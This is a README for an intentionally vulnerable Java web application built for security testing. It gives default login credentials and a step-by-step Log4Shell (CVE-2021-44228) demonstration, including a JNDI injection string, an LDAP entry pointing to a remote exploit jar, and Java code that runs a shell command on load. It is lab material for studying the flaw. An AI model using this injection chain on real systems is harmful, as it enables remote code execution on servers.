# vulnerable-webapp
An application with various vulnerabilities for testing

## Running the application

- Run the java file: ```java -jar vulnerable-webapp-[latest].jar```
- The default username is `jblogs` and the default password is `pa55word`.
- You will need a web browser such as firefox.


# Some vulnerabilities

## CVE-2021-44228 (log4shell)

Ensure the vulnerability works in versions of Java > 8 set the following property — JDK versions after JDKv8 disable class creation from URL codebases.

```
-Dcom.sun.jndi.ldap.object.trustURLCodebase=true
```
Note, a codebase can be defined as a source, or a place, from which to load classes into a virtual machine. 

If you want to debug the in-memory ldap server, you can enable unboundid debug logging using:

```
-Dcom.unboundid.ldap.sdk.debug.enabled=true -Dcom.unboundid.ldap.sdk.debug.level=INFO -Dcom.unboundid.ldap.sdk.debug.type=ASN1 -Dcom.sun.jndi.ldap.object.trustURLCodebase=true
```

Trigger the vulnerability by loading the LDAP entry using JNDI by supplying the following code injection into the *username* field of the `user-admin` page (other fields may work too!)

```
${jndi:ldap://127.0.0.1:8081/uid=java-ref,ou=people,dc=jisc,dc=ac,dc=uk}
```


The in-memory server has the following `javaNamingReference` object which will be looked up by the JNDI service invoked by the log4j substition code path:

```
dn: uid=java-ref,ou=people,dc=jisc,dc=ac,dc=uk
objectclass: top
objectclass: javaContainer
objectclass: javaObject
objectclass: javaNamingReference
javaCodeBase: http://localhost:8080/rce/rce-exploit-0.0.1-SNAPSHOT.jar
javaClassName: uk.ac.jisc.cybersec.rce.RceExploit
javaFactory: uk.ac.jisc.cybersec.rce.RceExploit
cn: Java Class
sn: Class
uid: java-ref
```

The URLClassLoader will lookup the `uk.ac.jisc.cybersec.rce.RceExploit` first from the local classpath (where it does not exist), then from the URL codebase provided by the LDAP entry. This triggers the download of the referenced `jar` file, and the instatiation of the `uk.ac.jisc.cybersec.rce.RceExploit` class. Triggering the static method in the malicious class:

```
package uk.ac.jisc.cybersec.rce;

/** Sample RCE exploit class.*/
public class RceExploit {
	
	static {
		try {
			System.out.println("Attempting takeover...");
			Runtime.getRuntime().exec("touch /Users/philsmart/test.txt");
			System.out.println("Takeover success!");
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
```
